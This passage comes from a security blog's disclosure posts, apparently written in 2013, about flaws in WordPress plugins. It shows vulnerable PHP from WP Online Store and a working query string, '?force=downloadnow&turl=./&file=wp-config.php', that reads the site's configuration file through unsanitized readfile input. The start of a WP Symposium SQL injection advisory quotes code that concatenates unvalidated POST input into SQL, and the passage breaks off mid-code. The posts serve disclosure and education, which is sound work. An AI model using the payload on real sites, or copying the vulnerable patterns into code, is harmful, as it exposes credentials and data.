			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c014613292215-120">120</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-121">121</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-122">122</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-123">123</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-124">124</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-125">125</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-126">126</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-127">127</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-128">128</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-129">129</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-130">130</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-131">131</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-132">132</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-133">133</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-134">134</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-135">135</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-136">136</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-137">137</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-138">138</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-139">139</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-140">140</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-141">141</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-142">142</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-143">143</div><div class="crayon-num" data-line="crayon-53c987717c014613292215-144">144</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c014613292215-145">145</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c014613292215-120"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">osc_session_init_fend</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-121"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c014613292215-122"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_name</span><span class="crayon-sy">(</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-123"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">request_type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">getenv</span><span class="crayon-sy">(</span><span class="crayon-s">'HTTPS'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'on'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-s">'SSL'</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'NONSSL'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c014613292215-124"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-125">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c014613292215-126"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_id</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-127">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c014613292215-128"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">request_type</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'SSL'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-129">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c014613292215-130"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_id</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-131">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c014613292215-132"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-133"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//if (!session_id())</span></div><div class="crayon-line" id="crayon-53c987717c014613292215-134"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-135"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ob_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c014613292215-136"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'force'</span><span class="crayon-sy">]</span><span class="crayon-o">==</span><span class="crayon-s">'downloadnow'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-137"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-type: application/x-octet-stream'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c014613292215-138"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-disposition: attachment; filename='</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-139">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c014613292215-140"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">readfile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'turl'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-141"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// unlink($_REQUEST['turl'] . $_REQUEST['backup_file']);</span></div><div class="crayon-line" id="crayon-53c987717c014613292215-142">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-143"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987717c014613292215-144"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">wp_enqueue_script</span><span class="crayon-sy">(</span><span class="crayon-s">'jquery'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c014613292215-145"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0061 seconds] -->
<p>The interesting thing is that on line 136 is checks the &#8220;force&#8221; request variable to see if it matches to &#8220;downloadnow&#8221;. If it is set, it will change the content type of the response to be a download, and then read the file set by the request variables &#8220;turl&#8221; and &#8220;file&#8221; and write that to the response. These variables are however not sanitized, which leads to an arbitrary file disclosure. We can exploit this by making a request to any page with following querystring, which will force the browser to download a page containing the contents of the wp-config.php file at the top of the file:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c020613217379" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
?force=downloadnow&amp;turl=./&amp;file=wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c020613217379-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c020613217379-1"><span class="crayon-sy">?</span><span class="crayon-v">force</span><span class="crayon-o">=</span><span class="crayon-i">downloadnow</span><span class="crayon-o">&amp;</span><span class="crayon-v">turl</span><span class="crayon-o">=</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-o">&amp;</span><span class="crayon-v">file</span><span class="crayon-o">=</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-i">php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>, <a href="http://ceriksen.com/tag/wp-online-store/" rel="tag">WP Online Store</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/#respond" title="Comment on WordPress Online Store arbitrary file disclosure">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-152 -->

				
					
<article id="post-132" class="post-132 post type-post status-publish format-standard hentry category-advisories tag-sql-injection tag-symposium tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2013/02/18/wp-symposium-multiple-sql-injection/" title="10:33 am" rel="bookmark" class="entry-date"><time datetime="2013-02-18T10:33:09+00:00" pubdate>February 18, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2013/02/18/wp-symposium-multiple-sql-injection/" title="Permalink to WP Symposium multiple SQL injection vulnerabilities" rel="bookmark">WP Symposium multiple SQL injection vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50674/">Secunia Advisory SA50674</a></p>
<p><strong>Analysis of groups get_user_list SQL injection vulnerability</strong></p>
<p>This first vulnerability in the <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/ajax/symposium_groups_functions.php">/ajax/symposium_groups_functions.php</a> file makes use of the functionality for people to view the users of a group. It accepts a groupID(gid) which it inserts without validation into a query and then spits out the result, even if you are not authenticated.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987717c908898597371" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Get group members
if ($_POST['action'] == 'get_group_members') {

	$gid = $_POST['gid'];

	// First clean up the table, making sure there are no user ID = 0 (do across all groups)
	$sql = "DELETE FROM ".$wpdb-&gt;prefix."symposium_group_members WHERE member_id = 0";
	$wpdb-&gt;query($sql);

	// Now get the members
	$sql = "SELECT u.ID, u.display_name, u.user_login FROM ".$wpdb-&gt;prefix."symposium_group_members m
			LEFT JOIN ".$wpdb-&gt;base_prefix."users u ON m.member_id = u.ID
			WHERE group_id = ".$gid." AND m.admin != 'on'
			ORDER BY u.display_name";
	$users = $wpdb-&gt;get_results($sql);

	$html = '';
	if ($users) {
		foreach ($users as $user) {
			$html .= '&lt;div class="user_list_item" id="'.$user-&gt;ID.'" style="clear:both; cursor:pointer; float:left; border:1px solid #aaa; background-color:#ccc;margin-bottom:2px;padding:2px;margin-right:2px;"&gt;';
			$html .= "&lt;img src='".get_option('symposium_images')."/cross.png' style='width:12px; height:12px; float:right; margin-left:3px;' alt='add' /&gt; ";
			$html .= $user-&gt;display_name.' ('.$user-&gt;ID.')';
			$html .= '&lt;/div&gt;';
		}	
	}

	echo $html;
	exit;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987717c908898597371-218">218</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-219">219</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-220">220</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-221">221</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-222">222</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-223">223</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-224">224</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-225">225</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-226">226</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-227">227</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-228">228</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-229">229</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-230">230</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-231">231</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-232">232</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-233">233</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-234">234</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-235">235</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-236">236</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-237">237</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-238">238</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-239">239</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-240">240</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-241">241</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-242">242</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-243">243</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-244">244</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987717c908898597371-245">245</div><div class="crayon-num" data-line="crayon-53c987717c908898597371-246">246</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987717c908898597371-218"><span class="crayon-c">// Get group members</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-219"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'get_group_members'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c908898597371-220">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-221"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$gid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'gid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c908898597371-222">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-223"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// First clean up the table, making sure there are no user ID = 0 (do across all groups)</span></div><div class="crayon-line" id="crayon-53c987717c908898597371-224"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"DELETE FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_group_members WHERE member_id = 0"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-225"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c908898597371-226">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-227"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Now get the members</span></div><div class="crayon-line" id="crayon-53c987717c908898597371-228"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT u.ID, u.display_name, u.user_login FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_group_members m</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-229"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LEFT JOIN "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users u ON m.member_id = u.ID</span></div><div class="crayon-line" id="crayon-53c987717c908898597371-230"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WHERE group_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$gid</span><span class="crayon-sy">.</span><span class="crayon-s">" AND m.admin != 'on'</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-231"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ORDER BY u.display_name"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c908898597371-232"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$users</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-233">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c908898597371-234"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-235"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$users</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987717c908898597371-236"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$users</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-v">$user</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-237"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;div class="user_list_item" id="'</span><span class="crayon-sy">.</span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">'" style="clear:both; cursor:pointer; float:left; border:1px solid #aaa; background-color:#ccc;margin-bottom:2px;padding:2px;margin-right:2px;"&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c908898597371-238"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;img src='"</span><span class="crayon-sy">.</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_images'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"/cross.png' style='width:12px; height:12px; float:right; margin-left:3px;' alt='add' /&gt; "</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-239"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-i">display_name</span><span class="crayon-sy">.</span><span class="crayon-s">' ('</span><span class="crayon-sy">.</span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">')'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987717c908898597371-240"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;/div&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-241"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987717c908898597371-242"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-243">&nbsp;</div><div class="crayon-line" id="crayon-53c987717c908898597371-244"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$html</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987717c908898597371-245"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">;</span></div><div 